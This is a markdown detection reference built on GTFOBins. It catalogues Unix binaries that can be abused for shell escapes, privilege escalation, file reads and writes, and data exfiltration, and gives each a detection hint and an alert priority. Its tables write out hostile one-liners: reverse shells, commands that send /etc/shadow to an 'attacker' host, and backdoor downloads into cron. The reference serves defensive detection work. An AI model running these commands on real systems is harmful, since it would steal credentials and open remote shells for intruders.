# GTFOBins — Complete Detection Reference

> Source: GTFOBins (https://gtfobins.github.io/) — 400+ entries
> Last updated: 2026-07-07
> Purpose: Comprehensive detection of Unix binary abuse for shell escape, privesc, file ops, and exfil

---

## Categories of Abuse

GTFOBins documents binaries that can be abused for:
- **Shell** — Break out of restricted environments
- **File read** — Read files the user shouldn't access (via SUID/sudo)
- **File write** — Write/overwrite arbitrary files
- **File upload** — Exfiltrate data to remote hosts
- **File download** — Retrieve files from remote hosts
- **SUID** — Exploit SUID bit for privilege escalation
- **Sudo** — Exploit sudo permissions for privilege escalation
- **Capabilities** — Exploit Linux capabilities

---

## Shell Escape / Privilege Escalation (via SUID or Sudo)

### Editors & Pagers

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `vim` / `vi` / `nvim` | `:!/bin/sh`, `:set shell=/bin/sh` then `:shell` | vim/vi/nvim spawning sh/bash child |
| `less` | `!/bin/sh` | less spawning shell |
| `more` | `!/bin/sh` (when output exceeds terminal) | more spawning shell |
| `man` | `!/bin/sh` from within pager | man spawning shell |
| `emacs` | `M-x shell`, `(shell-command "/bin/sh")` | emacs spawning shell |
| `nano` | `^R^X` then command (older versions) | nano spawning processes |
| `ed` | `!/bin/sh` | ed spawning shell |
| `pico` | `^R` read file / spawn | pico spawning processes |

### Scripting Languages

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `python` / `python3` | `import os; os.system("/bin/sh")`, `os.execl("/bin/sh","sh","-p")` | Python spawning shell |
| `perl` | `exec "/bin/sh"`, `perl -e 'exec "/bin/sh"'` | Perl spawning shell |
| `ruby` | `exec "/bin/sh"`, `ruby -e 'exec "/bin/sh"'` | Ruby spawning shell |
| `lua` | `os.execute("/bin/sh")` | Lua spawning shell |
| `php` | `php -r 'system("/bin/sh");'` | PHP spawning shell |
| `node` / `npm` | `require('child_process').spawn('/bin/sh')` | Node spawning shell |
| `tclsh` / `wish` | `exec /bin/sh <@stdin >@stdout 2>@stderr` | Tcl spawning shell |
| `gdb` | `!/bin/sh`, `call system("/bin/sh")` | GDB spawning shell |
| `jrunscript` / `jshell` | Java runtime exec | JVM spawning shell |

### Common Utilities

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `find` | `find . -exec /bin/sh \; -quit` | find with -exec spawning shell |
| `awk` / `gawk` / `mawk` | `awk 'BEGIN {system("/bin/sh")}'` | awk spawning shell |
| `env` | `env /bin/sh` | env spawning shell directly |
| `xargs` | `xargs -a /dev/null /bin/sh` | xargs spawning shell |
| `nice` / `ionice` / `timeout` | `nice /bin/sh`, `timeout 1 /bin/sh` | Wrapper spawning shell |
| `stdbuf` | `stdbuf -i0 /bin/sh` | stdbuf spawning shell |
| `watch` | `watch -x /bin/sh -c 'reset; exec sh'` | watch spawning shell |
| `time` | `/usr/bin/time /bin/sh` | time spawning shell |
| `taskset` | `taskset 1 /bin/sh` | taskset spawning shell |
| `nohup` | `nohup /bin/sh -c "reset; /bin/sh"` | nohup spawning shell |
| `flock` | `flock -u / /bin/sh` | flock spawning shell |
| `expect` | `expect -c 'spawn /bin/sh; interact'` | expect spawning shell |
| `script` | `script -c /bin/sh /dev/null` | script spawning shell |
| `screen` | `screen /bin/sh` | screen spawning shell |
| `tmux` | `tmux new -s escape` | tmux spawning sessions |

### File Managers / Transfer

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `ftp` | `!/bin/sh` | FTP spawning shell |
| `sftp` | `!/bin/sh` | SFTP spawning shell |
| `scp` | `scp -S /bin/sh x localhost:` | SCP with -S flag |
| `ssh` | `ssh -o ProxyCommand="/bin/sh" x` | SSH with ProxyCommand shell |
| `socat` | `socat stdin exec:/bin/sh` | socat spawning shell |
| `nc` / `ncat` | Reverse shell: `nc -e /bin/sh attacker port` | nc with -e flag |
| `curl` | `curl file:///etc/shadow` (file read) | curl with file:// protocol |
| `wget` | `wget --post-file=/etc/shadow http://attacker/` | wget POST with sensitive files |

### Package Managers

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `apt` / `apt-get` | `apt changelog pkg` → `!/bin/sh` from pager | apt spawning shell via pager |
| `pip` / `pip3` | `pip install . --break-system-packages` (malicious setup.py) | pip running arbitrary code |
| `gem` | `gem open -e "/bin/sh -c /bin/sh" pkg` | gem spawning shell |
| `npm` | `npm exec -- /bin/sh` | npm spawning shell |
| `cargo` | Malicious build.rs | cargo spawning unexpected processes |
| `docker` | `docker run -v /:/host -it alpine sh` | Docker with root volume mount |
| `kubectl` | `kubectl exec -it pod -- /bin/sh` | kubectl exec on pods |

### System Tools (Privileged)

| Binary | Escape Technique | Detection |
|--------|-----------------|-----------|
| `su` | `su` with known credentials | su usage |
| `sudo` | Misconfigured sudoers | sudo with unusual commands |
| `pkexec` | CVE-2021-4034 (PwnKit) | pkexec unusual execution |
| `doas` | Similar to sudo | doas usage |
| `chroot` | `chroot / /bin/sh` | chroot spawning shell |
| `nsenter` | `nsenter -t 1 -m -u -i -n -p -- /bin/sh` | nsenter targeting PID 1 |
| `unshare` | `unshare -r /bin/sh` | unshare spawning shell |
| `capsh` | `capsh --gid=0 --uid=0 --` | capsh escalating to root |
| `setarch` | `setarch $(arch) /bin/sh` | setarch spawning shell |

---

## File Read (SUID/Sudo/Capability Abuse)

| Binary | Technique | Detection |
|--------|-----------|-----------|
| `cat` / `tac` | Direct read | cat/tac on sensitive files with SUID |
| `head` / `tail` | Partial read | head/tail on /etc/shadow etc |
| `base64` / `base32` | Encode+read | base64 encoding sensitive files |
| `xxd` / `od` / `hd` | Hex dump | Hex-dumping sensitive files |
| `dd` | Block copy | dd reading /dev/sda or sensitive files |
| `diff` / `comm` | Compare leaks content | diff against sensitive files |
| `cut` / `paste` / `join` | Field extract | Processing sensitive file output |
| `strings` | Binary read | Strings on sensitive files |
| `ip` | Read via netns | `ip netns exec name cat /etc/shadow` |
| `dialog` | Read via --textbox | dialog displaying sensitive files |
| `openssl` | Encode read | `openssl enc -in /etc/shadow` |
| `tar` | Archive read | `tar cf - /etc/shadow \| tar xf -` |
| `zip` / `gzip` / `bzip2` | Compress read | Compressing and reading sensitive files |

---

## File Write (SUID/Sudo/Capability Abuse)

| Binary | Technique | Critical Target | Detection |
|--------|-----------|----------------|-----------|
| `cp` / `mv` | Overwrite | `/etc/passwd`, `/etc/shadow` | cp/mv targeting auth files |
| `dd` | Block write | Any file | dd writing to sensitive paths |
| `tee` | Append/overwrite | `/etc/passwd`, cron files | tee writing to sensitive paths |
| `sed` | In-place edit | Config files | sed -i on sensitive files |
| `awk` | Write output | `/etc/passwd` | awk redirecting to sensitive files |
| `curl` | Download to file | Anywhere | `curl -o /etc/cron.d/backdoor http://...` |
| `wget` | Download to file | Anywhere | `wget -O /etc/cron.d/backdoor http://...` |

---

## Data Exfiltration

| Binary | Technique | Detection |
|--------|-----------|-----------|
| `curl` | POST data | `curl --data @/etc/shadow http://attacker/` | curl with --data and sensitive files |
| `wget` | POST file | `wget --post-file=/etc/shadow http://attacker/` | wget --post-file |
| `ssh` / `scp` / `sftp` | Transfer out | `scp /etc/shadow user@attacker:` | SCP/SSH transferring sensitive files |
| `nc` / `ncat` | Raw transfer | `nc attacker 4444 < /etc/shadow` | nc sending to external IPs |
| `openssl` | Encrypted exfil | `openssl s_client -connect attacker:443 </etc/shadow` | OpenSSL connecting to external hosts |
| `socat` | Network transfer | `socat TCP:attacker:4444 file:/etc/shadow` | socat sending files externally |
| `tar` | Archive + send | `tar czf - /sensitive \| ssh attacker "cat > loot.tgz"` | tar piped to network |
| `base64` | Encode for DNS/HTTP | `base64 /etc/shadow` (then exfil encoded) | base64 on sensitive files |
| `xxd` | Hex encode for exfil | `xxd /etc/shadow` | xxd on sensitive files |

---

## Reverse Shell One-Liners (Know What to Hunt)

| Binary | Command | Detection |
|--------|---------|-----------|
| `bash` | `bash -i >& /dev/tcp/attacker/4444 0>&1` | bash with /dev/tcp |
| `sh` | `sh -i >& /dev/udp/attacker/4444 0>&1` | sh with /dev/udp or /dev/tcp |
| `python` | `python -c 'import socket,subprocess;...'` | python with socket imports |
| `perl` | `perl -e 'use Socket;...'` | perl with Socket usage |
| `ruby` | `ruby -rsocket -e 'f=TCPSocket.open...'` | ruby with socket operations |
| `php` | `php -r '$sock=fsockopen...'` | php with fsockopen |
| `nc` | `nc -e /bin/sh attacker 4444` or mkfifo variant | nc with -e or named pipes |
| `socat` | `socat exec:/bin/sh,pty,... TCP:attacker:4444` | socat connecting externally |
| `openssl` | `openssl s_client -connect attacker:4444 \| /bin/sh` | openssl piped to shell |
| `lua` | `lua -e "require('socket');..."` | lua with socket operations |
| `awk` | `awk 'BEGIN {s="/inet/tcp/0/attacker/4444";...'` | awk with /inet |
| `node` | `node -e "require('net').connect(4444,'attacker',..."` | node with net.connect |

---

## Detection Priority Matrix

### Critical (Immediate Alert)
- Any SUID binary spawning `/bin/sh` or `/bin/bash`
- `sudo` executing shell escapes (vim `:!sh`, less `!sh`, find `-exec sh`)
- Reverse shell patterns (bash /dev/tcp, python socket, nc -e)
- Docker/kubectl with root volume mount or host PID namespace

### High (Investigate Within 1 Hour)
- curl/wget POSTing sensitive files
- base64/xxd encoding of /etc/shadow, /etc/passwd, SSH keys
- openssl/socat/nc connecting to external IPs from servers
- tar/scp/sftp sending files to unexpected destinations
- Package managers (pip/npm/gem) running unexpected code

### Medium (Investigate Within 24 Hours)
- find/awk/env/xargs with unexpected -exec or system() patterns
- Script interpreters (python/perl/ruby) launched by SUID parents
- editors (vim/emacs/nano) spawning child shells
- ftp/sftp with shell escape (!) usage

### Low (Audit Trail)
- File reads via unusual paths (base64, xxd, dd)
- cp/mv/tee operations on sensitive files
- pager (less/more/man) shell escapes in non-interactive contexts
